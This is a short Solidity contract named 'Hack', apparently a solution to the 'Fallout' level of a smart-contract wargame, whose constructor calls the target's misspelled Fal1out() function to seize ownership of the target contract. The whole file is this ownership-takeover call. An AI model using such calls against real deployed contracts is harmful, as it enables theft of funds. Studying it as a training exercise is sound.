// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hack
{
    constructor(Fallout i) public payable 
    {
        // i.Fal1out{value:10 wei}();
        // is using syntax for sending value with a function call that was introduced in Solidity version 0.7.0.
        i.Fal1out();
    }
}

interface Fallout 
{
  function Fal1out() external  payable;
}